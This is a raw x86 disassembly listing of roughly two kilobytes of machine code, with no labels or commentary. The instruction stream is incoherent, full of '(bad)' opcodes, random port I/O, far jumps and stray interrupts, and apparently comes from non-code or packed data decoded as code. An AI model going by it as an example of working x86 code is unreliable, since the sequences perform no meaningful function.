  41209d:	mov    esi,0xd049fe8b
  4120a2:	fnstsw WORD PTR [ebx+0x40]
  4120a5:	mov    eax,ds:0xfb758318
  4120aa:	dec    edx
  4120ab:	inc    esp
  4120ac:	inc    esi
  4120ad:	pushf  
  4120ae:	jbe    0x412126
  4120b0:	dec    eax
  4120b1:	add    dl,BYTE PTR [edi-0x19f9e078]
  4120b7:	imul   ebp,DWORD PTR [esi],0x61ac4689
  4120bd:	cld    
  4120be:	pop    edi
  4120bf:	mov    ebx,0x70cc4826
  4120c4:	sub    eax,0xb65bc070
  4120c9:	retf   0x1862
  4120cc:	add    eax,0x4295b34b
  4120d1:	out    0x2d,al
  4120d3:	shl    BYTE PTR [edx-0x75],0x4d
  4120d7:	(bad)  
  4120d8:	pusha  
  4120d9:	loopne 0x412127
  4120db:	in     al,dx
  4120dc:	and    esp,0x55
  4120df:	jge    0x4120d0
  4120e1:	sar    DWORD PTR [bp+si],0x22
  4120e5:	mov    edx,0x27393659
  4120ea:	sub    al,0x7a
  4120ec:	in     eax,0xba
  4120ee:	fist   DWORD PTR ds:0x9e6ad3ef
  4120f4:	xchg   ebp,eax
  4120f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120f6:	push   ebx
  4120f7:	push   cs
  4120f8:	iret   
  4120f9:	rcr    BYTE PTR [edi+0x35],cl
  4120fc:	adc    ah,BYTE PTR [ecx-0x162c8e91]
  412102:	dec    ebx
  412103:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412104:	xor    esi,DWORD PTR [edi+esi*8]
  412107:	scas   eax,DWORD PTR es:[edi]
  412108:	push   ds
  412109:	int    0xf
  41210b:	fcmove st,st(7)
  41210d:	or     dh,BYTE PTR [edi]
  41210f:	sub    bh,BYTE PTR [eax]
  412111:	push   ss
  412112:	cmp    BYTE PTR [edx+0x17a14f96],0x66
  412119:	sub    eax,0xa6cc7be3
  41211e:	(bad)  
  41211f:	mov    al,ds:0xcdbbd4cf
  412124:	adc    al,0xa9
  412126:	repz jb 0x412173
  412129:	push   ebp
  41212a:	mov    ch,0x6b
  41212c:	mov    ebp,0x8b609173
  412131:	imul   esp,DWORD PTR [edx+0x4],0xffffff84
  412135:	and    DWORD PTR [ecx-0x26],ebp
  412138:	out    0x18,al
  41213a:	xchg   edx,eax
  41213b:	dec    ch
  41213d:	cmp    ecx,esi
  41213f:	add    ecx,DWORD PTR [edx+0x38f7ad10]
  412145:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412146:	fwait
  412147:	dec    bh
  412149:	jns    0x412150
  41214b:	xor    dl,BYTE PTR [esi]
  41214d:	(bad)  
  41214e:	retf   
  41214f:	mov    BYTE PTR [esi],ah
  412151:	push   edi
  412152:	sbb    al,0x1c
  412154:	ret    
  412155:	ficomp DWORD PTR [ebx+0x66026610]
  41215b:	fistp  DWORD PTR gs:[ebx-0x37]
  41215f:	(bad)  
  412160:	popa   
  412161:	ss push 0x4593660f
  412167:	jne    0x412112
  412169:	addr16 ja 0x412121
  41216c:	sbb    BYTE PTR [ebx-0x6ef276c7],al
  412172:	jg     0x412171
  412174:	shr    DWORD PTR [edi+eiz*2-0x60],0xe2
  412179:	repnz and DWORD PTR [ebp+0x18],ebp
  41217d:	mov    bh,0x8
  41217f:	or     cl,bl
  412181:	mov    bh,0xef
  412183:	popa   
  412184:	jmp    0x8852:0x1ce36947
  41218b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41218c:	mov    edx,DWORD PTR [ebx+eax*8+0x4291435b]
  412193:	cli    
  412194:	stos   BYTE PTR es:[edi],al
  412195:	sbb    bl,BYTE PTR [ebx]
  412197:	add    cl,BYTE PTR ds:0x4951235c
  41219d:	sbb    ebp,ebx
  41219f:	add    al,BYTE PTR [ecx-0x32]
  4121a2:	add    dh,BYTE PTR [ebx-0x20]
  4121a5:	into   
  4121a6:	int3   
  4121a7:	ins    BYTE PTR es:[edi],dx
  4121a8:	(bad)  
  4121a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121aa:	rcl    BYTE PTR [edx],0xae
  4121ad:	ins    DWORD PTR es:[edi],dx
  4121ae:	es mov dh,0xa5
  4121b1:	xchg   DWORD PTR [esi+0x41d51212],edx
  4121b7:	imul   ebx,esp,0xffffffc6
  4121ba:	cmp    cl,BYTE PTR [edi+esi*8+0x54f7d8e2]
  4121c1:	ror    DWORD PTR [ebx+0x4],cl
  4121c4:	ret    0x4e5e
  4121c7:	mov    ecx,0x8e9fe139
  4121cc:	mov    al,ds:0xd2112a0a
  4121d1:	out    0x1a,eax
  4121d3:	inc    esi
  4121d4:	inc    ebp
  4121d5:	pop    edx
  4121d6:	jge    0x4121b7
  4121d8:	cmp    al,0x7d
  4121da:	mov    ds:0xa1023f32,eax
  4121df:	shl    DWORD PTR [eax-0x34],1
  4121e2:	das    
  4121e3:	and    al,0x9e
  4121e5:	adc    BYTE PTR [edi+0x71],0x50
  4121e9:	cmp    cl,bh
  4121eb:	xchg   esp,eax
  4121ec:	lods   al,BYTE PTR ds:[esi]
  4121ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121ee:	jnp    0x412197
  4121f0:	sbb    ch,BYTE PTR [esi]
  4121f2:	push   0x64099bc8
  4121f7:	in     eax,dx
  4121f8:	lods   al,BYTE PTR ds:[esi]
  4121f9:	xchg   edi,ecx
  4121fb:	sbb    ch,BYTE PTR [ecx]
  4121fd:	xor    cl,BYTE PTR [esi]
  4121ff:	int    0xce
  412201:	aad    0xac
  412203:	sbb    DWORD PTR [ebx-0x72],ebp
  412206:	les    ecx,FWORD PTR [edi+0x37]
  412209:	fstp   QWORD PTR [esi+0x7a]
  41220c:	call   esi
  41220e:	sub    ah,dh
  412210:	mov    edi,0xdbbbd033
  412215:	inc    ebp
  412216:	fistp  WORD PTR [eax-0x19d25ded]
  41221c:	frstor [ebx-0x4]
  41221f:	call   0x6cd9:0xb8e36416
  412226:	sbb    eax,0xada40a9d
  41222b:	shl    esi,1
  41222d:	xor    DWORD PTR [esi+ecx*1],eax
  412230:	sub    BYTE PTR [edx+0x58932c4f],bh
  412236:	(bad)  
  412237:	adc    al,0x79
  412239:	sar    BYTE PTR [edx+0x53],1
  41223c:	jo     0x412208
  41223e:	cmp    ch,ch
  412240:	jnp    0x4121c2
  412242:	mov    dl,0xd8
  412244:	mov    cl,0x63
  412246:	js     0x41223d
  412248:	jo     0x4121e1
  41224a:	xor    BYTE PTR [edi],dl
  41224c:	int3   
  41224d:	cmp    BYTE PTR [ecx-0x1],al
  412250:	ret    0xb9f7
  412253:	fbld   TBYTE PTR [ecx]
  412255:	enter  0x572,0x7f
  412259:	xchg   edx,eax
  41225a:	mov    esp,edi
  41225c:	push   cs
  41225d:	xchg   ebx,eax
  41225e:	outs   dx,BYTE PTR ds:[esi]
  41225f:	pop    esi
  412260:	(bad)  
  412261:	pop    ebx
  412262:	pop    ecx
  412263:	lock or al,0x75
  412266:	sub    al,0x8
  412268:	and    al,0xce
  41226a:	dec    esp
  41226b:	and    ah,dh
  41226d:	cwde   
  41226e:	out    0xd7,eax
  412270:	jmp    0x2ce97180
  412275:	mov    al,ds:0x23bcc349
  41227a:	push   0x55b9d717
  41227f:	ds ja  0x412257
  412282:	pop    DWORD PTR [edi+0x4b461277]
  412288:	std    
  412289:	mov    edi,0xfeeacdb
  41228e:	in     al,dx
  41228f:	fld    DWORD PTR [edx-0x372bf569]
  412295:	aam    0xbd
  412297:	or     al,0x4c
  412299:	cmp    esi,DWORD PTR [ecx+0x19f67068]
  41229f:	popa   
  4122a0:	(bad)  
  4122a1:	and    ebp,esi
  4122a3:	scas   eax,DWORD PTR es:[edi]
  4122a4:	(bad)  
  4122a5:	jns    0x412249
  4122a7:	daa    
  4122a8:	enter  0xfdae,0xf
  4122ac:	add    eax,esi
  4122ae:	pop    edi
  4122af:	arpl   WORD PTR [ecx+0x64883b2e],cx
  4122b5:	xor    al,0x44
  4122b7:	das    
  4122b8:	mov    es,WORD PTR [ebx-0x5156fe97]
  4122be:	ins    BYTE PTR es:[edi],dx
  4122bf:	retf   
  4122c0:	rcr    BYTE PTR [ebx+edi*8+0x1c10cac3],cl
  4122c7:	arpl   WORD PTR [eax],bx
  4122c9:	pop    ecx
  4122ca:	add    eax,0x96a59b9d
  4122cf:	push   0x21
  4122d1:	leave  
  4122d2:	enter  0x85cf,0x40
  4122d6:	rcl    BYTE PTR fs:[ecx-0x43487f71],cl
  4122dd:	stc    
  4122de:	adc    ah,BYTE PTR [eax-0x72]
  4122e1:	dec    edi
  4122e2:	push   0x5c9364e0
  4122e7:	cmp    BYTE PTR [ebx+0x5],ch
  4122ea:	std    
  4122eb:	jo     0x4122e1
  4122ed:	fisttp DWORD PTR [eax+ecx*1+0x26a2ba37]
  4122f4:	imul   edx,DWORD PTR [ecx-0x3c674014],0xffffffb5
  4122fb:	jle    0x4122c9
  4122fd:	out    dx,eax
  4122fe:	pop    ebx
  4122ff:	mov    dl,0x97
  412301:	xchg   ebp,eax
  412302:	outs   dx,DWORD PTR ds:[esi]
  412303:	mov    eax,ds:0x83bfe84a
  412308:	jmp    0x24f4:0x593ed68e
  41230f:	lea    eax,ds:0x233989c0
  412315:	aam    0x65
  412317:	pop    ebx
  412318:	and    eax,edx
  41231a:	ds add eax,0x62694a2e
  412320:	les    eax,FWORD PTR [eax]
  412322:	jmp    0x6b5fa1c7
  412327:	into   
  412328:	popf   
  412329:	lods   al,BYTE PTR ds:[esi]
  41232a:	cmp    eax,0xbc9d609b
  41232f:	repnz mov dl,0xcc
  412332:	sbb    BYTE PTR [edx],0x34
  412335:	stc    
  412336:	push   ss
  412337:	mov    dh,0x9b
  412339:	ror    edx,0x42
  41233c:	sub    ebp,eax
  41233e:	mov    ecx,0x8b0e7be2
  412343:	pop    esi
  412344:	jl     0x412355
  412346:	inc    ebp
  412347:	mov    ds:0x60b034d,al
  41234c:	jge    0x412391
  41234e:	in     eax,0xb2
  412350:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412351:	call   0x5066cbaf
  412356:	mov    esi,0xdcd4dfd5
  41235b:	scas   al,BYTE PTR es:[edi]
  41235c:	xchg   ebp,eax
  41235d:	xchg   ebx,eax
  41235e:	loope  0x41239c
  412360:	sub    al,0xab
  412362:	jg     0x41233d
  412364:	jns    0x41236a
  412366:	push   ebp
  412367:	mov    al,0x20
  412369:	fnstsw WORD PTR [esi-0x1317dca7]
  41236f:	mov    edi,0x61f532dd
  412374:	outs   dx,DWORD PTR ds:[esi]
  412375:	inc    eax
  412376:	cmc    
  412377:	ficomp DWORD PTR [eax+0x267374c]
  41237d:	daa    
  41237e:	mov    al,0x3c
  412380:	pusha  
  412381:	xchg   ebx,eax
  412382:	gs dec ecx
  412384:	sub    DWORD PTR [edi*2+0xe8b4099],edx
  41238b:	popf   
  41238c:	imul   esp,DWORD PTR [ebx+0x63],0xffffffa3
  412390:	js     0x4123ca
  412392:	jno    0x4123c9
  412394:	mov    esi,0xc9823684
  412399:	pop    esp
  41239a:	mov    eax,0x2f4f3ba5
  41239f:	mov    ds:0x45fa3a5a,eax
  4123a4:	add    eax,0x27829b1a
  4123a9:	cmp    al,BYTE PTR es:[ecx]
  4123ac:	and    al,BYTE PTR [edx+0x4073e231]
  4123b2:	dec    edx
  4123b3:	imul   ebx,eax,0x56
  4123b6:	xchg   esi,eax
  4123b7:	jae    0x412390
  4123b9:	inc    edx
  4123ba:	adc    eax,0xadfdf0d3
  4123bf:	mov    dh,0x27
  4123c1:	inc    ebp
  4123c2:	jmp    0x4123cc
  4123c4:	mov    edx,0x4d12e5be
  4123c9:	xchg   esi,eax
  4123ca:	adc    esp,DWORD PTR [edi+ecx*1+0x38]
  4123ce:	aaa    
  4123cf:	psrlq  mm0,QWORD PTR [edx]
  4123d2:	inc    edx
  4123d3:	push   0xffffffe2
  4123d5:	push   cs
  4123d6:	mov    cl,0xae
  4123d8:	int3   
  4123d9:	bound  edx,QWORD PTR [edi+0x63fd1349]
  4123df:	sub    ebp,ebx
  4123e1:	sar    dl,cl
  4123e3:	dec    ecx
  4123e4:	and    esp,ebp
  4123e6:	xchg   edi,eax
  4123e7:	shl    BYTE PTR [eax],0xf0
  4123ea:	add    DWORD PTR [ebx],ecx
  4123ec:	sbb    BYTE PTR [edi+0x17ed937c],al
  4123f2:	mov    BYTE PTR [eax+esi*4],al
  4123f5:	ins    DWORD PTR es:[edi],dx
  4123f6:	mov    cl,al
  4123f8:	loopne 0x4123f2
  4123fa:	fst    st(2)
  4123fc:	out    0x12,eax
  4123fe:	stc    
  4123ff:	add    al,0xbe
  412401:	popa   
  412402:	lods   al,BYTE PTR ds:[esi]
  412403:	fadd   QWORD PTR [esi+edi*2]
  412406:	mov    esp,DWORD PTR [esp+edi*4]
  412409:	adc    esp,edi
  41240b:	cmp    dh,al
  41240d:	jp     0x412453
  41240f:	fldcw  WORD PTR ds:0x696918cb
  412415:	test   BYTE PTR [edi],cl
  412417:	lds    edi,FWORD PTR [eax+0x53]
  41241a:	jbe    0x41241c
  41241c:	(bad)  
  41241d:	push   esp
  41241e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41241f:	rcl    dh,1
  412421:	nop
  412422:	or     eax,ebx
  412424:	jmp    0x194f1bc0
  412429:	cmp    BYTE PTR [ecx],cl
  41242b:	loope  0x412405
  41242d:	lea    ebp,[ecx]
  41242f:	xchg   esp,eax
  412430:	imul   DWORD PTR [esi-0x1a]
  412433:	sub    edx,ecx
  412435:	push   esi
  412436:	adc    edi,ebx
  412438:	add    eax,0xef27bdee
  41243d:	cmp    eax,0xb485cb37
  412442:	fmul   DWORD PTR [ebp-0xd]
  412445:	push   esp
  412446:	aad    0x8b
  412448:	adc    WORD PTR [edx],ax
  41244b:	mov    edi,0x861ccfce
  412450:	sub    al,0x4d
  412452:	lds    eax,FWORD PTR [ebp+esi*2+0x26]
  412456:	xchg   esp,eax
  412457:	mov    dh,0xdd
  412459:	mov    ch,0x94
  41245b:	loopne 0x41248b
  41245d:	jmp    0x41246f
  41245f:	ja     0x4124d4
  412461:	je     0x412449
  412463:	add    BYTE PTR [ebp-0x69],bh
  412466:	xchg   ecx,eax
  412467:	mov    ds:0x12207c54,eax
  41246c:	test   BYTE PTR [edi+0x545404a9],dh
  412472:	sub    esi,DWORD PTR [esi*4+0x3547ec24]
  412479:	push   ebx
  41247a:	and    eax,DWORD PTR [ebp+0x17caffc7]
  412480:	daa    
  412481:	push   ds
  412482:	mov    edx,0x56644f9f
  412487:	xor    al,0x14
  412489:	in     al,0x6a
  41248b:	xchg   ebp,eax
  41248c:	or     eax,0x33361759
  412491:	jns    0x412435
  412493:	cdq    
  412494:	jmp    0x41248a
  412496:	jecxz  0x4124bb
  412498:	(bad)  
  412499:	fld    QWORD PTR [edi+0x709082d6]
  41249f:	adc    dl,BYTE PTR [ebp-0x50cba1a9]
  4124a5:	(bad)  
  4124a6:	lock addr16 adc al,0x2c
  4124aa:	leave  
  4124ab:	jp     0x4124e1
  4124ad:	jle    0x4124e6
  4124af:	lods   al,BYTE PTR ds:[esi]
  4124b0:	loope  0x41247a
  4124b2:	jp     0x4124a0
  4124b4:	jnp    0x4124b9
  4124b6:	faddp  st(4),st
  4124b8:	rcr    DWORD PTR [edx-0x4292e8ec],1
  4124be:	jmp    0x9d49:0x571aab0b
  4124c5:	mov    ecx,0x716dad9b
  4124ca:	and    edx,DWORD PTR [edx+0x160d6b9f]
  4124d0:	sbb    eax,0x1e712e66
  4124d5:	out    0x95,al
  4124d7:	fnstenv [esi+0x5eae6ba3]
  4124dd:	push   0xffffffa1
  4124df:	xchg   edi,eax
  4124e0:	stos   DWORD PTR es:[edi],eax
  4124e1:	data16 stos BYTE PTR es:[edi],al
  4124e3:	cli    
  4124e4:	mov    dh,0x1b
  4124e6:	daa    
  4124e7:	adc    esi,DWORD PTR [esi]
  4124e9:	(bad)  
  4124ea:	mov    ds:0x7e9216c9,eax
  4124ef:	add    eax,0x269fc948
  4124f4:	xchg   DWORD PTR [edi+0x2f4239d5],ebp
  4124fa:	push   ebp
  4124fb:	(bad)  
  4124fc:	call   0xdd3f:0xf3af5323
  412503:	add    bl,BYTE PTR [eax+0x70]
  412506:	mov    eax,ds:0xc422e084
  41250b:	mov    dh,BYTE PTR [eax+0x50]
  41250e:	nop
  41250f:	jae    0x41252e
  412511:	lock push edx
  412513:	push   ss
  412514:	fs push ds
  412516:	(bad)  
  412517:	fisub  DWORD PTR [ecx]
  412519:	sahf   
  41251a:	jle    0x412599
  41251c:	ds or  dl,bh
  41251f:	sbb    eax,0xb6e8cdcd
  412524:	mov    cl,0xbe
  412526:	lods   eax,DWORD PTR ds:[esi]
  412527:	test   DWORD PTR [edi+esi*8-0x34],0xa643c16e
  41252f:	test   DWORD PTR [bp+0x5b],ebp
  412533:	add    edx,DWORD PTR [ebx]
  412535:	icebp  
  412536:	int    0x4b
  412538:	and    DWORD PTR [edx-0x52],ecx
  41253b:	adc    esp,esi
  41253d:	stos   DWORD PTR es:[edi],eax
  41253e:	popw   ds
  412540:	add    eax,0x1b9da1a9
  412545:	cmp    al,cl
  412547:	test   al,0x61
  412549:	mov    edx,0x73bde99a
  41254e:	mov    esi,0xa35909e8
  412553:	lods   eax,DWORD PTR ds:[esi]
  412554:	(bad)  
  412555:	push   ebp
  412556:	jnp    0x412569
  412558:	push   ebp
  412559:	pcmpeqd mm7,QWORD PTR [ecx-0x63]
  41255d:	in     eax,0x10
  41255f:	sub    bl,cl
  412561:	fwait
  412562:	lds    eax,FWORD PTR [edx]
  412564:	push   ds
  412565:	mov    ch,0xbf
  412567:	jp     0x4125d7
  412569:	iret   
  41256a:	xchg   BYTE PTR [ebp+0xf],bh
  41256d:	inc    BYTE PTR [ebx-0x3c0f9695]
  412573:	sub    al,0x3e
  412575:	sub    edi,eax
  412577:	mov    ah,0x64
  412579:	inc    esi
  41257a:	and    bl,BYTE PTR [edi-0x20]
  41257d:	jbe    0x4125c8
  41257f:	jo     0x412600
  412581:	jle    0x41259e
  412583:	scas   al,BYTE PTR es:[edi]
  412584:	shl    DWORD PTR [ebp+0x2317f955],cl
  41258a:	sub    DWORD PTR [ecx+ecx*4],edi
  41258d:	cmc    
  41258e:	or     al,0x44
  412590:	pusha  
  412591:	adc    BYTE PTR [eax],bh
  412593:	mov    esp,0x17553d2
  412598:	push   edx
  412599:	push   0x379b2c51
  41259e:	outs   dx,BYTE PTR ds:[esi]
  41259f:	into   
  4125a0:	out    0x34,al
  4125a2:	push   es
  4125a3:	cmp    eax,0xebc7a557
  4125a8:	xor    bh,bl
  4125aa:	adc    BYTE PTR [ecx],ch
  4125ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125ad:	std    
  4125ae:	xor    al,0x6
  4125b0:	mov    bl,0x50
  4125b2:	loope  0x412593
  4125b4:	sahf   
  4125b5:	jmp    0x412555
  4125b7:	inc    esp
  4125b8:	mov    al,ds:0x1b67133
  4125bd:	xor    eax,0xf54e547e
  4125c2:	icebp  
  4125c3:	test   ebx,esi
  4125c5:	(bad)  
  4125c6:	out    dx,eax
  4125c7:	cld    
  4125c8:	add    al,0xc7
  4125ca:	cmp    edi,edi
  4125cc:	inc    edi
  4125cd:	cdq    
  4125ce:	mov    ecx,0xd3819a65
  4125d3:	dec    edi
  4125d4:	fs mov ch,0x1b
  4125d7:	aam    0xdc
  4125d9:	xlat   BYTE PTR ds:[ebx]
  4125da:	sub    dh,ah
  4125dc:	popf   
  4125dd:	inc    edi
  4125de:	jecxz  0x412640
  4125e0:	sbb    al,0x25
  4125e2:	push   0x44
  4125e4:	mov    esp,0x32183bb8
  4125e9:	adc    DWORD PTR [eax+0x4448d82f],edi
  4125ef:	adc    eax,0x88025b8e
  4125f4:	push   ecx
  4125f5:	cs in  eax,0x21
  4125f8:	sub    al,0x66
  4125fa:	je     0x4125a1
  4125fc:	pop    edx
  4125fd:	push   ebx
  4125fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125ff:	std    
  412600:	mov    al,ds:0x778c5629
  412605:	lods   al,BYTE PTR ds:[esi]
  412606:	fsubr  QWORD PTR ds:0xef23154b
  41260c:	mov    ah,BYTE PTR [eax+0x57]
  41260f:	leave  
  412610:	js     0x4125e9
  412612:	ror    BYTE PTR [edx+0x74],1
  412615:	mov    ch,0xf7
  412617:	sub    ebp,DWORD PTR fs:[ebp-0x5ab8bde6]
  41261e:	mov    cl,0x25
  412620:	test   DWORD PTR [ecx+0x59],ebp
  412623:	mov    eax,ds:0xd0d464e6
  412628:	cmp    BYTE PTR [edx],bl
  41262a:	mov    bh,BYTE PTR [ecx-0x2c6a37c1]
  412630:	or     BYTE PTR [edx+0x67aad7fc],0xa4
  412637:	(bad)  
  412639:	gs pop edx
  41263b:	and    al,0x57
  41263d:	loopne 0x41263d
  41263f:	fs lock pusha 
  412642:	dec    ebp
  412643:	or     edi,DWORD PTR [ecx]
  412645:	lods   eax,DWORD PTR ds:[esi]
  412646:	inc    ebp
  412647:	out    dx,al
  412648:	cmp    eax,0xad96b815
  41264d:	mov    esi,0x7aabb682
  412652:	sahf   
  412653:	and    eax,0x9644484d
  412658:	dec    ecx
  412659:	mov    ebp,0x7dd97b33
  41265e:	mov    ah,0xf6
  412660:	repz js 0x412698
  412663:	daa    
  412664:	addr16 sbb edx,eax
  412667:	jg     0x4126ca
  412669:	mov    eax,edx
  41266b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41266c:	push   ss
  41266d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41266e:	mov    BYTE PTR ds:0xe8ad712f,0xf
  412675:	repnz fs popf 
  412678:	mov    ds:0x6e416723,eax
  41267d:	and    DWORD PTR [ecx+0x96afea3],0xffffffc7
  412684:	adc    edx,ecx
  412686:	fst    DWORD PTR [ebx]
  412688:	ss out 0x31,al
  41268b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41268c:	lods   al,BYTE PTR ds:[esi]
  41268d:	gs xchg edi,eax
  41268f:	test   BYTE PTR [edi-0xc],ah
  412692:	and    eax,0x9820ecab
  412697:	sbb    esi,ebp
  412699:	xchg   esi,eax
  41269a:	fisub  WORD PTR [edx-0x7c26a9a4]
  4126a0:	pop    edi
  4126a1:	sbb    cl,dl
  4126a3:	mul    DWORD PTR [ecx+0x66583782]
  4126a9:	sub    DWORD PTR [ecx+0x3d6784a6],esi
  4126af:	sbb    BYTE PTR [edi+0x48d67312],ch
  4126b5:	or     DWORD PTR [eax+0x15],esp
  4126b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126b9:	and    cl,dl
  4126bb:	lods   eax,DWORD PTR ds:[esi]
  4126bc:	pop    eax
  4126bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126be:	jecxz  0x412691
  4126c0:	es mov ch,0x1f
  4126c3:	in     al,dx
  4126c4:	test   al,0xa5
  4126c6:	imul   BYTE PTR [ecx+0x2e]
  4126c9:	adc    eax,0x4642df80
  4126ce:	xor    al,0x44
  4126d0:	or     al,bl
  4126d2:	mov    ecx,ebx
  4126d4:	dec    edi
  4126d5:	retf   
  4126d6:	or     bl,BYTE PTR ds:0x39e3cbbd
  4126dc:	out    0xed,al
  4126de:	dec    edi
  4126df:	loop   0x412739
  4126e1:	dec    edi
  4126e2:	scas   al,BYTE PTR es:[edi]
  4126e3:	outs   dx,DWORD PTR ds:[esi]
  4126e4:	pop    ds
  4126e5:	xor    eax,0xde04e8a4
  4126ea:	push   ss
  4126eb:	ins    BYTE PTR es:[edi],dx
  4126ec:	iret   
  4126ed:	icebp  
  4126ee:	outs   dx,BYTE PTR ds:[esi]
  4126ef:	xchg   edx,eax
  4126f0:	xlat   BYTE PTR ds:[ebx]
  4126f1:	jnp    0x41275e
  4126f3:	stos   BYTE PTR es:[edi],al
  4126f4:	mov    ch,0x15
  4126f6:	mov    bl,0xf9
  4126f8:	cli    
  4126f9:	repz jecxz 0x41268b
  4126fc:	sub    al,0x3a
  4126fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126ff:	pop    ds
  412700:	stos   DWORD PTR es:[edi],eax
  412701:	outs   dx,BYTE PTR ds:[esi]
  412702:	(bad)  
  412703:	in     eax,dx
  412704:	mov    esi,0xc552ea39
  412709:	mov    ebx,0xf3c034c2
  41270e:	jl     0x4126a7
  412710:	ins    DWORD PTR es:[edi],dx
  412711:	dec    ecx
  412712:	(bad)  
  412713:	add    DWORD PTR [esi],eax
  412715:	cmp    eax,0xcf987c3c
  41271a:	jmp    ebx
  41271c:	jmp    0x5e7c:0xc86678b
  412723:	cmp    eax,ebp
  412725:	and    dl,BYTE PTR [ecx+eiz*8]
  412728:	dec    edi
  412729:	aaa    
  41272a:	jns    0x41278c
  41272c:	lea    eax,[esi+ebp*4+0x36]
  412730:	xchg   edx,eax
  412731:	enter  0x7aea,0xc0
  412735:	cli    
  412736:	xchg   ecx,eax
  412737:	les    edi,FWORD PTR [ebx+0x52e03168]
  41273d:	mov    ecx,0x7a6be1c1
  412742:	xlat   BYTE PTR ds:[ebx]
  412743:	call   0xd2ce:0x88628549
  41274a:	jge    0x4126ed
  41274c:	jg     0x412736
  41274e:	pushf  
  41274f:	mov    ah,0xe5
  412751:	mov    cl,0x15
  412753:	xor    dl,BYTE PTR [edx+eax*1+0x1c]
  412757:	xchg   esp,eax
  412758:	push   ebx
  412759:	mov    dl,0xe2
  41275c:	imul   esi,DWORD PTR [ecx],0xffffffc1
  41275f:	bound  edi,QWORD PTR [esi+0x51819e8]
  412765:	imul   edi,DWORD PTR [esi+0x5a14ce83],0x31
  41276c:	xor    esp,DWORD PTR [ebp-0xa1e548c]
  412772:	sub    eax,0xf6261158
  412777:	imul   ecx,DWORD PTR [ebx+0x52bf31af],0x77
  41277e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41277f:	sar    BYTE PTR [edx+0x34401da0],0x5d
  412786:	into   
  412787:	sbb    dl,BYTE PTR [esp+ebp*4-0x5cae4ce9]
  41278e:	in     eax,0xe9
  412790:	sub    DWORD PTR [edx-0x24b05af6],ebx
  412796:	mov    bh,0x82
  412798:	push   ecx
  412799:	std    
  41279a:	out    0x78,al
  41279c:	les    esi,FWORD PTR [ebx+eiz*8-0x26]
  4127a0:	xchg   edi,eax
  4127a1:	xchg   edx,eax
  4127a2:	fwait
  4127a3:	dec    ecx
  4127a4:	inc    esi
  4127a5:	cmp    BYTE PTR [ecx-0x8],bh
  4127a8:	pop    ss
  4127a9:	int    0xe7
  4127ab:	mov    dl,0x3f
  4127ad:	fisub  DWORD PTR ds:0x23f7bae2
  4127b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127b4:	mov    ds:0x1475107f,al
  4127b9:	inc    edx
  4127ba:	jecxz  0x4127fb
  4127bc:	mov    al,ds:0x64efbc25
  4127c1:	push   ecx
  4127c2:	cs iret 
  4127c4:	stos   DWORD PTR es:[edi],eax
  4127c5:	sbb    BYTE PTR [edi],0xc
  4127c8:	xor    al,0x90
  4127ca:	ins    DWORD PTR es:[edi],dx
  4127cb:	mov    eax,ds:0xa5c613a
  4127d0:	test   al,0x60
  4127d2:	aas    
  4127d3:	pop    esi
  4127d4:	mov    esi,0x87d1acc9
  4127d9:	mov    edx,0x9fe58465
  4127de:	(bad)  
  4127df:	dec    ecx
  4127e0:	repnz stos BYTE PTR es:[edi],al
  4127e2:	cmp    al,0x5d
  4127e4:	das    
  4127e5:	movzx  edi,si
  4127e8:	mov    ebx,0xb6b7be57
  4127ed:	mov    bh,0xd3
  4127ef:	nop
  4127f0:	mov    edi,0x78cdf80
  4127f5:	ja     0x412833
  4127f7:	rcr    DWORD PTR ds:0xf0292cd8,cl
  4127fd:	ja     0x4127cd
  4127ff:	jbe    0x4127bb
  412801:	scas   eax,DWORD PTR es:[edi]
  412802:	lock iret 
  412804:	inc    ebx
  412805:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412806:	leave  
  412807:	ret    0x9995
  41280a:	paddw  mm5,QWORD PTR ds:[edx+eax*4-0x115af222]
  412813:	xlat   BYTE PTR ds:[ebx]
  412814:	test   esi,edi
  412816:	push   esp
  412817:	jl     0x4127ad
  412819:	jb     0x412807
  41281b:	int3   
  41281c:	outs   dx,DWORD PTR ds:[esi]
  41281d:	test   al,0x7
  41281f:	jle    0x4127b5
  412821:	pop    ds
  412822:	inc    esi
  412823:	pop    edx
  412824:	jb     0x4127ce
  412826:	out    0xec,al
  412828:	mov    BYTE PTR [esi],cl
  41282a:	mov    esi,0x95cc2f05
  41282f:	sub    ebx,DWORD PTR [eax+0x323f451d]
  412835:	push   ebx
  412836:	push   0xa017c61e
  41283b:	imul   ebp,DWORD PTR [eax+0x54],0xffffffdf
  41283f:	cmp    esp,DWORD PTR [ecx+0x2]
  412842:	test   BYTE PTR [ebx+0xff77cb2],al
  412848:	jmp    0xa7bc5546
  41284d:	rol    eax,cl
  41284f:	fstp   TBYTE PTR [ebx+0x2d]
  412852:	(bad)  
  412853:	scas   eax,DWORD PTR es:[edi]
  412854:	lock retf 0x470e
  412858:	lods   al,BYTE PTR ds:[esi]
  412859:	xor    eax,0xc850de44
  41285e:	adc    al,BYTE PTR [ebp-0x62]
  412861:	daa    
  412862:	lock imul ebx,DWORD PTR [ecx-0x1b41d8cc],0xffffffa0
  41286a:	(bad)  
  41286b:	stos   BYTE PTR es:[edi],al
  41286c:	or     eax,0xb820099
  412871:	mov    ss,WORD PTR [eax-0x2e4ed824]
  412877:	stos   DWORD PTR es:[edi],eax
  412878:	dec    edx
  412879:	aaa    
